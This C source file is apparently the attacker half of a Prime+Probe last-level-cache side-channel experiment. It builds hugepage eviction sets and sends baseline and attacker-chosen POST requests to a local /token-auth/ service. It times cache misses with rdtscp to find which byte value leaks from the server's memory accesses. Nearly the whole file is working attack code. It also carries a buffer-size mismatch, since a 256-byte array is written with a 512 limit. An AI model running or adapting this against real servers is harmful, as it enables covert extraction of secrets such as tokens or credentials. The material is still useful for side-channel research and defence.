#include <stdio.h>
#include <stdint.h>

#include <x86intrin.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "attacker.h"

#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

// LLC details
#define LLC_SETS 12288
#define LLC_WAYS 16
#define LLC_SIZE (LLC_WAYS * LLC_SETS * LINE_SIZE)
#define HUGE_PAGE_SIZE (2 * 1024 * 1024) // 2mb

// prime+probe
#define ATTACK_RUNS 1000
#define EVICTION_THRESHOLD 5000
#define CACHE_STRIDE 4096
#define PROBE_SIZE (1024 * 1024 * 1024)//(256 * 1024 * 1024)// 256mb
#define PAGE_COUNT (PROBE_SIZE / HUGE_PAGE_SIZE)
#define MAX_TIME 2000
// socket  volatile uint8_t tmp = *(volatile uint8_t *)curr; 
#define PORT 8080
#define INET "127.0.0.1"

int clientfd;

uint8_t *probe_head;

uint64_t c_threshold;

char buf[1024]= {0};
char attack_data[256];

int main(int argc, char* argv[]) {
     // setup socket connection 
    struct sockaddr_in servaddr;
    open_socket(&clientfd, &servaddr);
    connect(clientfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

    // allocate mem to probe_head
    probe_arr_setup();
    //printf("Probe array base address: %p\n", (void*)probe_head);

    // threshold for classifying cache miss
    //c_threshold = EVICTION_THRESHOLD;

    char *baseline_data = 
    "POST /token-auth/ HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Length: 35\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "username=none&password=none&id=0000";
    
    get_inputs(attack_data, argc, argv);
    
    // get page table entries in cache lookup
    // for (int i = 0; i < SETS; i++) {
    //     for (int w = 0; w < WAYS; w++) {
    //         volatile uint8_t *addr = &probe_array[(w * 4096) + (i * LINE_SIZE)];
    //         volatile uint8_t dummy = *addr; 
    //     }
    // }
    // _mm_mfence();
    int max = 0;
    uint8_t spiking_byte;

    //exit(1);
    for (int i = 0; i < 256; i++){ // from byte 0x00 - 0xFF
        
        uint8_t target_byte = (uint8_t)i;
        printf("\n===== EVICTION COUNT FOR BYTE %x =====\n", target_byte);
        node_t *probe_arr = build_linked_list(target_byte);
        if (probe_arr == NULL){
            continue;
        }

        int baseline_count = 0;
        int attack_count = 0;
        for (int j = 0; j < ATTACK_RUNS; j++) {
            //PRIME
            prime_cache(probe_arr);
            _mm_lfence();
            // BASELINE
            send(clientfd, baseline_data, strlen(baseline_data), 0);

            int n = -1;
            while (n < 0) {
                n = recv(clientfd, buf, sizeof(buf), 0); // deetct response started
            }
            _mm_mfence();

            //PROBE
            check_cache_presence(probe_arr, &baseline_count);

            while (recv(clientfd, buf, sizeof(buf), 0) > 0); // drain socket
            _mm_lfence();

            //usleep(1);
            // = ATTACK =
            //PRIME
            prime_cache(probe_arr);
            _mm_lfence();
            // ATTACK
            send(clientfd, attack_data, strlen(attack_data), 0);
            
            n = -1;
            while (n < 0) {
                n = recv(clientfd, buf, sizeof(buf), 0); // detect response started
            }
            _mm_mfence();

            //PROBE
            check_cache_presence(probe_arr, &attack_count);

            while (recv(clientfd, buf, sizeof(buf), 0) > 0); // drain socket
        } 
        int diff = attack_count - baseline_count;
        if (diff > max){
            max = diff;
            spiking_byte = target_byte;
        }
        if(1/*diff != 0*/){
            printf("\n- DIFF: %d misses\n- ATTACK: %d/1000 misses\n- BASELINE: %d/1000 misses\n", diff, attack_count, baseline_count);
            printf("threshold used: %ld\n", c_threshold);
        }
    }   
    printf("\nLargest Spike Byte: %x (%d)\n", spiking_byte, max);

    close(clientfd);
    return 0;

}

// takes in a byte and builds up an array of pointers(addresses) to prime+probe associated with that byte
void probe_arr_setup(){
    // allocates mem for probe space (pointer chain)
    probe_head = mmap(NULL, PROBE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0); // allocate 512mb in RAM using hugetlb size pages (2MB)
    if (probe_head == MAP_FAILED) {
        perror("mmap failed - use sudo sysctl -w vm.nr_hugepages=256");
        exit(1);
    }
    memset(probe_head, 1, PROBE_SIZE); // make OS give physical ram 
}

// takes in a byte and builds up an array of pointers(addresses) to prime+probe associated with that byte
node_t* build_linked_list(uint8_t target_byte){
    // find addresses associated with the byte
    size_t byte_offset = CACHE_STRIDE * target_byte;

    node_t *byte_addresses[PAGE_COUNT] = {(node_t *)NULL};

    
    int max_evictors = 20; // no of addresses in eviction set


    int interestingCount = 0;
    // loop for each page and get addresses for that byte#
    for (int p = 0; p < PAGE_COUNT; p++) {
        node_t *addr = (node_t *)(probe_head + (p * HUGE_PAGE_SIZE) + byte_offset);
        if(isAddressInteresting(addr)){
            byte_addresses[interestingCount] = addr;
            interestingCount ++;
        }
    }

    if(interestingCount < max_evictors){ // if no addresses evicted at all then this byte isnt worth looking at
        printf("For byte %x not enough interesting addresses detected (found: %d)\n", target_byte, interestingCount);
        return NULL;
    }
    if(interestingCount > 0){
        printf("NUMBER OF INTERESTING ADDRESSES FOUND: %d/%d\n", interestingCount, PAGE_COUNT);
    }

    // shuffle to trick prefetcher
    for(int i = 0; i < interestingCount; i++){
        node_t *tmp = byte_addresses[i];
        int shuffle_index = rand() % interestingCount;
        // swap
        byte_addresses[i] = byte_addresses[shuffle_index];
        byte_addresses[shuffle_index] = tmp;
    }

    // link the pointer chain 
    for (int i = 0; i < interestingCount-1; i++){
        byte_addresses[i]->next = byte_addresses[i+1];
    }
    byte_addresses[interestingCount-1]->next = NULL;

    uint64_t avg_hit = avg_hit_time(byte_addresses[0]);

    c_threshold = avg_hit + 100;
    printf("THRESHOLD: %ld\n", c_threshold);
    // return start of pointer chain
    return byte_addresses[0];
}

int isAddressInteresting(node_t *addr){
    addr->next= NULL;
    for (int t = 0; t < 100; t++){
        usleep(1);

        // PRIME
        volatile uint8_t tmp = *(volatile uint8_t *)addr;
        _mm_lfence();
        
        // ATTACK
        send(clientfd, attack_data, strlen(attack_data), 0);    
        while(recv(clientfd, buf, sizeof(buf), 0) < 0);

        //PROBE
        uint64_t t1,t2;
        unsigned int pid;

        _mm_mfence();
        t1 = __rdtscp(&pid); 
        _mm_lfence();

        volatile uint8_t dummy = *(volatile uint8_t *)addr;

        _mm_lfence();
        t2 = __rdtscp(&pid);
        _mm_lfence();

        while(recv(clientfd, buf, sizeof(buf), 0) > 0);
        
        if(t2-t1 > 160){
            //printf("\n===========INTERESTING===========\n");
            //printf("Diff for address %p: %ld\n\n", (void *)addr, (t2-t1));
            return 1;
        }
        _mm_lfence();
    }

    return 0;
}

// Prime LLC
void prime_cache(node_t *base_ptr){
    // loops through pointer array for a byte 2 times
    for(int i = 0; i < 2; i++){
        node_t *current = base_ptr;
        while (current != NULL){
            volatile uint8_t tmp = *(volatile uint8_t *)current;
            current = current->next;
        }
    }
    _mm_mfence();
}

void check_cache_presence(node_t *base_ptr, int *result){
    uint64_t t1, t2;
    unsigned int pid;

    node_t *current = base_ptr;
    _mm_mfence();
    t1 = __rdtscp(&pid); 
    _mm_lfence();

    // loop through all set pointer addresses
    while (current != NULL){
        volatile uint8_t tmp = *(volatile uint8_t *)current;
        current = current->next;
    }

    _mm_lfence();
    t2 = __rdtscp(&pid);
    _mm_lfence();

    //printf("THRESHOLD: %ld\n", c_threshold);

    if (t2 - t1 > c_threshold){ // if miss detected

        if (t2 - t1 <= MAX_TIME){ // limits huge values like 70000 from a kernel interrpt from effecting measurement
            (*result)++;
        }
    }
}


void get_inputs(char attack_data[], int argc, char* argv[]){
    char *attack_id;
    if (argc == 2){
        attack_id = argv[1]; 
    }else{
        printf("No Attack ID Entered\n");
        exit(1);
    }
    char body[128];
    int body_len = snprintf(body, sizeof(body), "username=none&password=none&id=%s", attack_id);

    snprintf(attack_data, 512, 
        "POST /token-auth/ HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Content-Length: %d\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n\r\n"
        "%s", body_len, body);
}

void open_socket(int *clientfd, struct sockaddr_in *servaddr){
    
    *clientfd = socket(AF_INET, SOCK_STREAM, 0);

    int flags = fcntl(*clientfd, F_GETFL, 0);
    fcntl(*clientfd, F_SETFL, flags | O_NONBLOCK);

    servaddr->sin_family = AF_INET;
    servaddr->sin_port = htons(PORT);
    servaddr->sin_addr.s_addr = inet_addr(INET);
}


void shuffle(int shuffle_arr[]){
    for (int i = 0; i < LLC_SETS; i++){
        int tmp = shuffle_arr[i];
        int shuffle_index = rand() % LLC_SETS;
        shuffle_arr[i] = shuffle_arr[shuffle_index];
        shuffle_arr[shuffle_index] = tmp;
    }
}

uint64_t avg_hit_time(node_t *head){
    uint64_t total_cycles = 0;
    char cal_buf[1024];
    
    char *baseline_data = 
        "POST /token-auth/ HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Content-Length: 35\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "username=none&password=none&id=0000";
    for(int i = 0; i < 100; i++) {
        prime_cache(head); // Ensure it's in cache

        send(clientfd, baseline_data, strlen(baseline_data), 0);
        while(recv(clientfd, cal_buf, sizeof(cal_buf), 0) < 0);
        
        uint64_t t1, t2;
        unsigned int junk;
        _mm_lfence();
        t1 = __rdtscp(&junk);
        
        node_t *curr = head;
        while(curr) {
            volatile uint8_t tmp = *(volatile uint8_t *)curr; 
            curr = curr->next;
        }
        
        _mm_lfence();
        t2 = __rdtscp(&junk);
        total_cycles += (t2 - t1);
        while(recv(clientfd, cal_buf, sizeof(cal_buf), 0) > 0); // Drain
    }
    
    uint64_t avg_hit_time = total_cycles / 100;
    return avg_hit_time;
}